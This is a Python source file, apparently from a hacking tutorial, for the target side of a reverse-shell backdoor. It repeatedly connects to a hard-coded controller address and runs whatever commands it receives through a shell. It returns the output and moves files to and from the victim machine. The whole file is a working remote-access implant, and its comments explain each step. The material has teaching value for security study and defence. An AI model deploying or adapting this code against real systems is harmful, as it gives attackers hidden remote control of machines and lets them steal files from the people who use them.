# Import relevant libraries.
# Socket is for connectivity between server and target.
# Time is for delaying the infinite loop by 20 seconds each time it runs.
# Subprocess is used to execute commands on the target.
# json is to format data sent between machines to ensure it's transmittable and readable.
# os enables directory traversal (using commands like cd)
import socket
import time
import subprocess
import json
import os

# Used to send the responses from this target.
def reliable_send(data):
        # jsondata is the variable storing the output of the json.dumps() function on the input command
        # Why use json.dumps()? json.dumps() function converts the input into a string that can be transmitted over a network.
        # Python is no good at creating useable / transmittable strings, but JSON conventions do just that for transmittability.
        jsondata = json.dumps(data)
        # 's' refers to the variable defined later in the program for the socket connection.
        s.send(jsondata.encode())

def reliable_recv():
        # First, create a 'data' variable with an empty string
        data = ''
        # then create an infinite loop for receiving commands from the server
        while True:
                try:
                        # The 'recv' function below is a from the 'socket' library and takes the data from the server.
                        # 1024 is the number of bytes to process. We also decode the data (encoded above with jsondata.encode()).
                        # rstrip() removes trailing characters from the 1024 byte length.
                        data = data + s.recv(1024).decode().rstrip()
                        # Using json.loads() to return the received info from the target - string is created with json.dumps() and read with json.loads().
                        return json.loads(data)
                except ValueError:
                        continue

# Create the 'Connection' function
def connection():
	# Create an infinite loop
	while True:
		# Create a 20 second delay between connection attempts
		time.sleep(20)
		try:
			# Try to connect to the server IP and Port
			s.connect(('192.168.86.32',1988))
			# If connection is successful, call the 'Shell' function
			shell()
			# Once 'Shell' connection has been called, close the socket
			s.close()
			# Once the socket has been closed, break the infinite loop
			break
		except:
			# If the 'try' section fails (connection to server fails), then call the 'Connection' function again.
			connection()

# Create the upload_file function corresponding to the download_file function in the server.
def upload_file(file_name):
	# The reason we 'read bytes' is because the target machine is reading data only. The SERVER writes the data that is read by the target machine to the server-side machine.
	f = open(file_name, 'rb')
	# Now that the target machine has 'read bytes' into memory, it can be sent via the socket using s.send with the contents of the file (from the above line).
	s.send(f.read())

def download_file(file_name):
	# Set the variable 'f' to OPEN a file of the same name as the target file by using the 'write bites' function.
	# We can then use other functions like f.write and f.close to WRITE to the file and then CLOSE the file once fully copied (downloaded to the target machine).
	f = open(file_name, 'wb')
	# Set a timeout in the function so that if there is an issue with writing the file contents the program doesn't crash.
	s.settimeout(1)
	# Set 'chunk' variable to contain the next 1,024 bytes of the file to be downloaded.
	chunk = s.recv(1024)
	# The 'while' loop keeps returning data so long as 'chunk' has data left to transfer.
	while chunk:
		# This writes the next 1,024 bytes to the file.
		f.write(chunk)
		# We then try to write another batch of data to the 'chunk' variable.
		try:
			chunk = s.recv(1024)
		# if there is no more data to write, the timeout will be hit and the loop will break (the file has been fully copied).
		except socket.timeout as e:
			break
	# Remove the timeout from the function now that the file has been fully-written.
	s.settimeout(None)
	# Close the file now that it has been fully copied.
	f.close()

# Create the 'Shell' function to process commands
def shell():
	while True:
		# Create 'command' variable as the received command to execute
		command = reliable_recv()
		# If the input received from the server is 'quit', break the infinite loop, closing the connection.
		if command == 'quit':
			break
		# If the input has 'cd ' as the first 3 characters (the [:3] part), the use the os library to transverse directories.
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		# If 'clear' command is received, pass and restart the infinite loop - no action required on the target machine.
		elif command == 'clear':
			pass
		# If the command is 'download', run the newly-created 'upload_file' function defined above (server-side is asking to download, therefore this target machine will UPLOAD the file to the server).
		elif command[:8] == 'download':
			upload_file(command[9:])
		# If the command is 'upload', run the newly-created 'download_file' function defined above (server-side is asking to upload, therefore this target machine will DOWNLOAD the file to the server).
		elif command[:6] == 'upload':
			download_file(command[7:])
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			# Prior to sending the response to the server, the result must be decoded because the 'execute' and 'result' variables are already encoded by the subprocess function.
			result = result.decode()
			reliable_send(result)

# Create socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
